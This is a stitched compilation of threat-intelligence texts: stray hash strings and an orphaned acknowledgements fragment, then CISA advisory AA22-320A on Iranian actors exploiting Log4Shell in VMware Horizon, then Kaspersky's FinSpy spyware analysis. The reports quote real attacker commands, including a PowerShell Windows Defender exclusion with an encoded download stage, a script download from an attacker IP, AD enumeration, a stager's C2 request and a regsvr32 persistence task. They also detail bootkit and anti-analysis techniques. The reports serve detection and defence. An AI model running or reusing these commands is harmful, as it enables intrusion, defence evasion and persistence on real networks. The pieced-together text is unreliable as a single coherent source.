a1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7 e9a5f0c7656329ced63d4c8742da51b4 48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a eea4d43f9e3700ebcd61405776eb249a d477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899 fbba113d1d121220fa43f90b3a20870a 3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409 AcknowledgementsBeyond the listed authors are dozens of consultants and analysts who have already been working to help our clients with cases related to exploitation of CVE-2023-34362.
We would also like to specifically thank Raymond Leong from the Mandiant FLARE team for his invaluable support. 
title: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a Summary From mid-June through mid-July 2022, CISA conducted an incident response engagement at a Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced persistent threat (APT) activity.
In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence.
CISA and the Federal Bureau of Investigation (FBI) assess that the FCEB network was compromised by Iranian government-sponsored APT actors. 
CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises. 
CISA and FBI encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities.
If suspected initial access or compromise is detected based on IOCs or TTPs described in this CSA, CISA and FBI encourage organizations to assume lateral movement by threat actors, investigate connected systems (including the DC), and audit privileged accounts.
All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity. 
For more information on Iranian government-sponsored Iranian malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and FBI’s Iran Threats webpage. 
Download the PDF version of this report: pdf, 528 kb. 
For a downloadable copy of the Malware Analysis Report (MAR) accompanying this report, see: MAR 10387061-1.v1. 
For a downloadable copy of IOCs, see: AA22-320A.stix, 1.55 mb. 
Technical Details Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11.
See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK:registered: tactics and techniques with corresponding mitigation and/or detection recommendations. 
Overview In April 2022, CISA conducted retrospective analysis using EINSTEIN—an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected APT activity on an FCEB organization’s network.
CISA observed bi-directional traffic between the network and a known malicious IP address associated with exploitation of the Log4Shell vulnerability (CVE-2021-44228) in VMware Horizon servers.
In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity.
Specifically, CISA observed HTTPS activity from IP address 51.89.181[.]64 to the organization’s VMware server.
Based on trusted third-party reporting, 51.89.181[.]64 is a Lightweight Directory Access Protocol (LDAP) server associated with threat actors exploiting Log4Shell.
Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address.
CISA also observed a DNS query for us‐nation‐ny[.]cf that resolved back to 51.89.181[.]64 when the victim server was returning this Log4Shell LDAP callback to the actors’ server. 
CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise.
As trusted-third party reporting associated Log4Shell activity from 51.89.181[.]64 with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organization’s DC. From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software.
The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies. 
Threat Actor Activity In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization’s unpatched VMware Horizon server.
As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217[.]2 lasting 17.6 seconds. 
The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to
Windows Defender
[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc "$BASE64 encoded payload to download next stage and execute it" The exclusion rule allowlisted the entire c:\drive, enabling threat actors to download tools to the c:\drive without virus scans.
The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\users\public\mde.ps1
[T1105].
When executed, mde.ps1 downloaded file.zip from 182.54.217[.]2 and removed mde.ps1 from the disk [T1070.004]. file.zip contained XMRig cryptocurrency mining software and associated configuration files. 
WinRing0x64.sys – XMRig Miner driver wuacltservice.exe – XMRig Miner config.json – XMRig miner configuration RuntimeBroker.exe – Associated file.
This file can create a local user account
[T1136.001] and tests for internet connectivity by pinging 8.8.8.8
[T1016.001].
The exploit payload created a Scheduled Task
[T1053.005] that executed RuntimeBroker.exe daily as SYSTEM.
Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.
The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task. 
See MAR 10387061-1.v1 for additional information, including IOCs, on these four files. 
After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount
[T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.
Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.]sh server associated with 144.76.136[.]153.
The actors downloaded the following tools: PsExec – a Microsoft signed tool for system administrators. 
Mimikatz – a credential theft tool. 
Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io.
CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.
Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account
[T1136.002].
Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.
Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.
The threat actors were able to implant Ngrok on multiple hosts to ensure Ngrok’s persistence should they lose access to a machine during a routine reboot.
The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.]com and korgn.su.lennut[.]com (the prior domain in reverse).
It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.]com, *.ngrok[.]io, ngrok.*.tunnel[.]com, or korgn.*.lennut[.]com. 
Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain [T1018]: Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address > 
The threat actors also changed the password for the local administrator account
[T1098] on several hosts as a backup should the rogue domain administrator account get detected and terminated.
Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed. MITRE ATT&CK TACTICS AND TECHNIQUES See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations.
For additional mitigations, see the Mitigations section. 
Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use Recommendations Exploit Public-Facing Application T1190 The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server. 
Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [M1050]. 
Mitigation: Perform regular vulnerability scanning to detect Log4J vulnerabilities and update Log4J software using vendor provided patches
[M1016],[M1051]. Execution Technique Title ID Use Recommendation Command and Scripting Interpreter: PowerShell T1059.001 The actors ran PowerShell commands that added an exclusion rule to Windows Defender. 
The actors executed PowerShell on the AD to obtain a list of machines on the domain. 
Mitigation: Disable or remove PowerShell for non-administrative users [M1042],[M1026] or enable code-signing to execute only signed scripts [M1045]. 
Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. 
Persistence Technique Title ID Use Recommendations Account Manipulation T1098 The actors changed the password for the local administrator account on several hosts. 
Mitigation: Use multifactor authentication for user and privileged accounts [M1032]. Detection:
Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670.
Monitor for modification of accounts in correlation with other suspicious activity [DS0002]. 
Create Account: Local Account T1136.001 
The actors’ malware can create local user accounts. 
Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts. 
Detection:
Monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add , useradd, and dscl -create
[DS0017]. Detection:
Enable logging for new user creation
[DS0002]. Create Account:
Domain Account T1136.002 
The actors used Mimikatz to create a rogue domain administrator account. 
Enable logging for new user creation, especially domain administrator accounts
[DS0002]. Scheduled Task/Job: Scheduled Task T1053.005 
The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM. 
Mitigation: Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM
[M1028]. Detection:
Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows [DS0009] Detection:
Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service
[DS0003]. Valid Accounts: Default Accounts T1078.001 
The actors used built-in Windows user account DefaultAccount. 
Mitigation: Change default usernames and passwords immediately after the installation and before deployment to a production environment [M1027]. Detection:
Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028]. Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools T1562.001 
The actors added an exclusion rule to Windows Defender.
The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive. 
The actors manually disabled Windows Defender via the GUI. 
Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
[M1018]. Detection:
Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender
[DS0024]. Detection:
Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux [DS0013]. Detection:
Monitor processes for unexpected termination related to security tools/services [DS0009]. 
Indicator Removal on Host: File Deletion T1070.004 
The actors removed malicious file mde.ps1 from the dis. Detection:
Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [DS0017]. Detection:
Monitor for unexpected deletion of files from the system [DS0022]. 
Credential Access Technique Title ID Use Recommendations OS Credential Dumping: LSASS Memory T1003.001 
The actors were observed trying to dump LSASS process. 
Mitigation: With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping [M1043] Mitigation: On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing [M1040]. 
Mitigation: Ensure that local administrator accounts have complex, unique passwords across all systems on the network [M1027]. Detection:
Monitor for unexpected processes interacting with LSASS.exe. 
Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored.
[DS0009]. Detection:
Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS
[DS0017]. Credentials from Password Stores T1555 The actors used Mimikatz to harvest credentials. 
Mitigation: Organizations may consider weighing the risk of storing credentials in password stores and web browsers.
If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations [M1027]. 
Monitor for processes being accessed that may search for common password storage locations to obtain user credentials [DS0009]. 
Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials [DS0017]. 
Discovery Technique Title ID Use Recommendations Remote System Discovery T1018 
The actors executed a PowerShell command on the AD to obtain a list of all machines attached to the domain. 
Monitor executed commands and arguments that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0017]. Detection:
Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0029]. 
Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession [DS0009]. System Network Configuration Discovery: Internet Connection Discovery T1016.001 The actors’ malware tests for internet connectivity by pinging 8.8.8.8. Mitigation: Monitor executed commands, arguments [DS0017] and executed processes (e.g., tracert or ping)
[DS0009] that may check for internet connectivity on compromised systems. 
Lateral Movement Technique Title ID Use Recommendations Remote Services:
Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network. 
Mitigation: Use MFA for remote logins [M1032]. 
Mitigation: Disable the RDP service if it is unnecessary [M1042]. 
Mitigation: Do not leave RDP accessible from the internet.
Enable firewall rules to block RDP traffic between network security zones within a network [M1030]. 
Mitigation: Consider removing the local Administrators group from the list of groups allowed to log in through RDP
[M1026]. 
Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10).
Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [DS0028]. Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok to proxy RDP connections and to perform command and control. 
Mitigation: Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists
[M1037]. Detection:
Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure)
[DS0029]. Ingress Tool Transfer T1105 
The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok. 
Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. 
INCIDENT RESPONSE If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC. 
CISA recommends organizations apply the following steps before applying any mitigations, including patching. 
Immediately isolate affected systems. 
Collect and review relevant logs, data, and artifacts.
Take a memory capture of the device(s) and a forensic image capture for detailed analysis. 
Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation. 
Report incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or your local FBI field office, or
FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. Mitigations CISA and FBI recommend implementing the mitigations below and in Table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors. 
Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version. 
If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat those VMware Horizon systems as compromised.
Follow the pro-active incident response procedures outlined above prior to applying updates.
If no compromise is detected, apply these updates as soon as possible. 
See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable. 
Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic.
While installing the updates, ensure network perimeter access controls are as restrictive as possible. 
If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds.
Implement temporary solutions using an account with administrative privileges.
Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible. 
Prior to implementing any temporary solution, ensure appropriate backups have been completed. 
Verify successful implementation of mitigations by executing the vendor supplied script Horizon_Windows_Log4j_Mitigations.zip without parameters to ensure that no vulnerabilities remain.
See KB87073 for details. 
Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs). 
Minimize the internet-facing attack surface by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services that are not essential to business operations.
Where possible, implement regularly updated web application firewalls (WAF) in front of public-facing services.
WAFs can protect against web-based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic. 
Use best practices for identity and access management (IAM) by implementing phishing resistant multifactor authentication (MFA), enforcing use of strong passwords, regularly auditing administrator accounts and permissions, and limiting user access through the principle of least privilege.
Disable inactive accounts uniformly across the AD, MFA systems, etc. 
If using Windows 10 version 1607 or Windows Server 2016 or later, monitor or disable Windows DefaultAccount, also known as the Default System Managed Account (DSMA). 
Audit domain controllers to log successful Kerberos Ticket Granting Service (TGS) requests and ensure the events are monitored for anomalous activity. 
Secure accounts. 
Enforce the principle of least privilege.
Administrator accounts should have the minimum permission necessary to complete their tasks. 
Ensure there are unique and distinct administrative accounts for each set of administrative tasks. 
Create non-privileged accounts for privileged users and ensure they use the non-privileged accounts for all non-privileged access (e.g., web browsing, email access). 
Create a deny list of known compromised credentials and prevent users from using known-compromised passwords. 
Secure credentials by restricting where accounts and credentials can be used and by using local device credential protection features. 
Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored. 
Ensure storage of clear text passwords in LSASS memory is disabled.
Note: For Windows 8, this is enabled by default.
For more information see Microsoft Security Advisory Update to Improve Credentials Protection and Management. Consider disabling or limiting NTLM and WDigest Authentication. 
Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information).
For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). 
Minimize the AD attack surface to reduce malicious ticket-granting activity.
Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that threat actors attempt to crack. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory.
CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
To get started: Select an ATT&CK technique described in this advisory (see table 1). 
Align your security technologies against the technique. 
Test your technologies against the technique. 
Analyze your detection and prevention technologies performance. 
Repeat the process for all security technologies to obtain a set of comprehensive performance data. 
Tune your security program, including people, processes, and technologies, based on the data generated by this process. 
CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory. 
References [1] MITRE ATT&CK Version 11: Software – Ngrok Revisions Initial Version: November 16, 2022 
title: FinSpy: unseen findings url: https://securelist.com/finspy-unseen-findings/104322/ FinSpy, also known as FinFisher or Wingbird, is an infamous surveillance toolset.
Kaspersky has been tracking deployments of this spyware since 2011.
Historically, its Windows implant was distributed through a single-stage installer.
This version was detected and researched several times up to 2018.
Since that year, we observed a decreasing detection rate of FinSpy for Windows.
While the nature of this anomaly remained unknown, we began detecting some suspicious installers of legitimate applications, backdoored with a relatively small obfuscated downloader.
We were unable to cluster those packages until the middle of 2019 when we found a host that served these installers among FinSpy Mobile implants for Android.
Over the course of our investigation, we found out that the backdoored installers are nothing more than first stage implants that are used to download and deploy further payloads before the actual FinSpy Trojan. 
Apart from the Trojanized installers, we also observed infections involving usage of a UEFI or MBR bootkit.
While the MBR infection has been known since at least 2014, details on the UEFI bootkit are publicly revealed in this article for the first time. 
We decided to share some of our unseen findings about the actual state of FinSpy implants.
We will cover not only the version for Windows, but also the Linux and macOS versions, since they have a lot of internal structure and code similarities. 
The full details of this research, as well as future updates on FinSpy, are available to customers of the APT reporting service through our Threat Intelligence Portal. 
Contact: intelreports@kaspersky.com UEFI infection During our research, we found a UEFI bootkit that was loading FinSpy.
All machines infected with the UEFI bootkit had the Windows Boot Manager (bootmgfw.efi) replaced with a malicious one.
When the UEFI transfers execution to the malicious loader, it first locates the original Windows Boot Manager.
It is stored inside the efi\microsoft\boot\en-us\ directory, with the name consisting of hexadecimal characters.
This directory contains two more files: the Winlogon Injector and the Trojan Loader.
Both of them are encrypted with RC4.
The decryption key is the EFI system partition GUID, which differs from one machine to another. 
Sample contents of the \efi\microsoft\boot\en-us\ directory Once the original bootloader is located, it is loaded into memory, patched and launched.
The patched launcher: Patches the function of the OS loader that transfers execution to the kernel The patched function hooks the kernel’s PsCreateSystemThread function, which, when called for the first time, creates an additional thread that decrypts the next loader stage and launches it. 
The next stage: Locates the Trojan loader file on the EFI partition and decrypts it Waits until a user logs on and injects the Trojan loader into exe. 
The Trojan loader: Extracts the Trojan from resources and drops it under the name dll Decrypts the Trojan with a XOR-based cipher and unpacks it with aPLib Reflectively loads and launches the Trojan. 
MBR infection Older machines that do not support UEFI can be infected through the MBR.
When the victim machine starts up, the infected MBR copies the initial loader code from the last megabyte of the hard drive to the highest available memory located before the EBDA1.
This code hooks the 13h and 15h BIOS interrupts and then launches the original MBR.
The 15h interrupt makes sure that the Windows loader does not overwrite the copied code.
When this interrupt is called to get the size of the area before the EBDA, the hook will reduce the amount of available memory.
As for the 13h interrupt hook (which manages reading information from disk), it patches the OS loader when it is read from disk.
Just as in the case with the EFI infection, the hooked functions place their own hooks on further OS loading stages.
The last hook in the chain creates a thread in the kernel that injects the next stage into winlogon.exe. 
In case the infection is installed on a 32-bit machine, the process of injecting code into winlogon.exe is more complex than the one observed in the UEFI infection.
It is as follows: A thread with trampoline shellcode is created inside exe. 
This shellcode duplicates the exe process handle and transfers it to explorer.exe. 
The shellcode injects another trampoline shellcode in Explorer. 
The second shellcode makes exe inject the Trojan loader back into winlogon.exe. 
This roundabout way of injecting code is intended to trick security solutions. 
The injected Trojan loader is the same as the UEFI one. 
User Mode Infection Overview This infection is by far the most complex.
In short, the attack scenario is as follows: 
The victim downloads a Trojanized application and executes it. 
During its normal course of operation the application connects to a C2 server, downloads and then launches a non-persistent component called the Pre-Validator.
The Pre-Validator ensures that the victim machine is not used for malware analysis. 
The Pre-Validator downloads Security Shellcodes from the C2 server and executes them.
In total, it deploys more than 30 shellcodes.
Each shellcode collects specific system information (e.g. the current process name) and uploads it back to the server. 
In case a check fails, the C2 server terminates the infection process.
Otherwise, it continues sending shellcodes. 
If all security checks pass, the server provides a component that we call the Post-Validator.
It is a persistent implant likely used to ensure that the victim is the intended one.
The Post-Validator collects information that allows it to identify the victim machine (running processes, recently opened documents, screenshots) and sends it to a C2 server specified in its configuration. 
Depending on the information collected, the C2 server may command the Post-Validator to deploy the full-fledged Trojan platform or remove the infection. 
Overview of the user mode infection Trojanized applications Throughout our research, we identified numerous legitimate applications backdoored with FinSpy.
Examples include software installers (e.g. TeamViewer, VLC Media Player, WinRAR) as well as portable applications. 
All observed backdoored application samples have their original digital signature.
It is invalid, which indicates that the application has been patched.
While the entry point function of the application looks clear, inspection of the executable’s PE file sections does reveal anomalies: the backdoored application has its last section (.rsrc on the screenshot below) expanded by 51 KB. Sections of the original (left) and backdoored (right) application Apart from that, a part of code from the .text section (roughly 8 KB) is overwritten with heavily obfuscated code, with the original application code placed in the expanded last section. 
When the backdoored application launches, it runs as normal, i.e. the inserted obfuscated code does not impact the application workflow.
At some point the application executes a jump instruction that redirects execution to the obfuscated trampoline in the .text section.
This instruction appears to be placed randomly in the code.
For example, a call to the CreateWindowExW function has been replaced: The original (left) and patched (right) code of the backdoored application This trampoline is protected with an obfuscator that we dubbed FinSpy Mutator.
It launches a code that: Decrypts and launches a slightly modified Metasploit Reverse HTTPS stager.
The decryption procedure: Is obfuscated with FinSpy Mutator Involves applying 10 operations (ADD, SUB, XOR, ROL, ROR) to every byte of the stager Is different in every backdoored installer. 
Restores the code in the .text section that was overwritten with the malicious code (recall that the original code is saved in the resource section) 
Resolves relocations in the restored code Restores the instruction that has been overwritten with a jump Jumps to the restored instruction, thus resuming the execution of the original application. 
The Metasploit stager connects to a configured C2 server using HTTPS for communication.
In the case of 5EDF9810355DE986EAD251B297856F38, the stager sends the following GET request to the C2 server:GET https://45[.]86[.]163[.]138/blog/ASVn6Wg5VbnZxiG2PSVbaSa-G8PmI2ew2zFBQGEZbDUEmx9mE88dw0Zxmu-AeuheOJYJ1F6kTh6uA0UJDkfISp--k6bGNOuULoTSlr-AXwvWapnFLOe4QEpqY_pe3uoGC88y3JqiQifHlRRqcE9whGX_-X14BIv35Q HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Host: 45[.]86[.]136[.]138 Connection: Keep-Alive Cache-Control: no-cache The C2 server replies with a component that we called the Pre-Validator in response to the GET request.
The Metasploit stager launches it. 
The Pre-Validator The Pre-Validator is a shellcode obfuscated with FinSpy Mutator.
On startup, it: Hooks the NtTerminateProcess and ExitProcess functions to make sure the Pre-Validator continues working if the backdoored application is closed.
The hooked functions close all the application’s windows but do not terminate its process. 
Makes an initial POST request to the C2 server.
Example of the request URL: https://45[.]86[.]163[.]138/blog/index.asp?attachmentid=a46dee635db8017962741f99f1849471&d=5d7e89e6b4874d0df95141bd923556f8 (all parts of this URL vary between samples).
All communications between the server are encrypted with RC4. 
The reply to the initial POST request contains a shellcode that we called a Security Shellcode.
On receiving it, the Pre-Validator: Decrypts and executes the received Security Shellcode Sends the shellcode execution results to the C2 server via a POST request. 
Receives the next Security Shellcode from the C2 server and repeats the steps above. 
The nature of these shellcodes indicates that they are used to fingerprint the system and verify that it is not used for malware analysis.
It is important to highlight that the shellcodes only collect the data, all the checks are performed server-side.
In case a shellcode uploads suspicious execution results (e.g. the Pre-Validator is running on a virtual machine), the server provides a shellcode that terminates the Pre-Validator. 
The received shellcodes are protected with either FinSpy Mutator, an obfuscator resembling OLLVM or both these protectors.
In total, we observed 33 Security Shellcodes provided by the server (listed in execution order): Shellcode # Description 1 Attempts to detect a hypervisor with the CPUID (EAX = 1) instruction.
If detected, returns the hypervisor name (EAX = 0x40000000), otherwise returns zero bytes. 
2 Checks whether the current process needs to be impersonated (for example, if an unprivileged user runs the backdoored application as administrator). 
3 Returns the user’s profile folder (e.g. C:\Users\username) 4 Returns the short form of the user’s profile folder (e.g. C:\Users\abcdef~1) 5 Returns the type of the drive containing the backdoored application (e.g. removable drive) 6 Returns process names of the current process tree (i.e. the current process, the parent process, the grandparent process, etc.) 7 Returns the path to the ‘Program Files’ folder. 
8 For the system drive
, returns: Overall available space Space available to current user (may be less than overall available space due to quotas) Disk capacity 9 Returns the path to the user’s temporary folder. 10 Returns the list of network adapter types, IP and MAC addresses assigned to them. 11 Returns the list of running processes 12 Returns ProcessDebugPort value returned by NtQueryInformationProcess for current process. 13 Returns ProcessDebugObjectHandle value returned by NtQueryInformationProcess for current process. 14 Returns TotalNumberOfObjects and TotalNumberOfHandles values of objects created by NtCreateDebugObject. 
15 Returns the current user’s SID. 
16 Returns the list of images (EXE/DLL files) loaded into the current process. 
17 Returns OSVERSIONINFOEXW and SYSTEM_INFO structures. 
18 Returns information about the machine’s BIOS. 
19 Returns the list of object names in the \GLOBAL??
directory. 
20 Returns information about the operating system. 
21 Returns the current user’s name, computer name, path to the current executable, its name and command line path. 
22 Returns the list of loaded drivers. 
23 Returns the list of PDB paths of loaded drivers 24 Returns the first 16 bytes of the first exported Zw* function of ntdll.dll (ZwAcceptConnectPort) 25 Verifies the signature of the parent process. 
26 Returns information about connected Plug and Play devices. 
27 Returns information about the computer system (from SELECT *
FROM Win32_ComputerSystem WMI query) 28 Returns the list of connected PCI devices. 29 Returns names of shortcuts in the Desktop directory. 
30 Returns the list of top-level and child window class names not owned by the current or parent process. 
31 Returns the list of top-level and child window titles not owned by the current or parent process. 
32 Returns the current domain SID. 
33 Cleans API functions potentially hooked by security solutions: Nt* functions in ntdll.dll and all exported functions in kernel32.dll, kernelbase.dll and advapi32.dll. 
Once all security checks are passed, the C2 server sends a shellcode that downloads and runs the Post-Validator Installer. 
The Post-Validator Installer This module is an obfuscated shellcode.
It: Creates a subdirectory (name differs between samples) in the C:\ProgramData directory Drops two files in the newly created subdirectory: The Post-Validator Loader DLL 
A shellcode with the Post-Validator itself. 
The file names are hardcoded in the dropper but are unique for each sample and appear to be randomly generated. 
Creates a scheduled task that runs at system startup and launches the Post-Validator Loader via regsvr32 (task action:
%windir%\syswow64\regsvr32.exe /s “<path to the Loader DLL>”) After the Post-Validator is installed, the Pre-Validator shuts down. 
The Post-Validator Loader The Post-Validator Loader is a huge (3-9 MB) obfuscated DLL.
The Task Scheduler launches it at system startup through regsvr32.exe.
Its main function is several megabytes in size, but despite that, its purpose is simple: read and execute a shellcode that is stored in the same directory as the Post-Validator Loader. 
Sample scheduled task properties The launched shellcode decrypts the Post-Validator (it is stored in the same file with the shellcode) with RC4 (key: domain SID) and reflectively loads it. 
The Post-Validator The Post-Validator is a DLL obfuscated with VMProtect.
This module uses the same communication protocol that is used in the main Trojan component: 
The TLV (type-length-value) format to exchange data with C2 servers TLV type constants that are found in the Trojan The Trojan’s Cryptography Library to encrypt/decrypt exchanged data On startup, the Post-Validator verifies that it is not launched inside a sandbox environment.
It then starts communication with C2 servers specified in its configuration, sending heartbeat messages with 15-minute intervals.
Each heartbeat includes brief information about the victim machine. 
The heartbeat reply may contain different commands. 
TLV ID Command purpose (inferred from the main Trojan) Implementation of command in the Post-Validator 0x8030A0 Retrieves the implant configuration. 
0x8070A0 Retrieve the list of files with data prepared for exfiltration. 
Sends back three strings in a TLV: 243a, 201a and 201b (‘virtual’ data file names) 0x8072A0 Upload a prepared file with a specified name to the C2 server. 
If the prepared file name is: 201a, obtains the list of processes and sends it to the C2 server. 201b, gets the list of recent files and sends it to the C2 server. 243a, takes a screenshot and uploads it to the C2 server. 0x8054A0, 0x805BA0, 0x8056A0, 0x805DA0, 0x8057A0, 0x805EA0 
Commands are used to download and install plugins. 
Commands are used to download and run the Trojan Installer. 
0x801530, 0x801630, 0x801730, 0x8018A0 Uninstall the Trojan. 
Uninstall the Pre-Validator. 0x7502A0 Disconnect from the C2 server. 
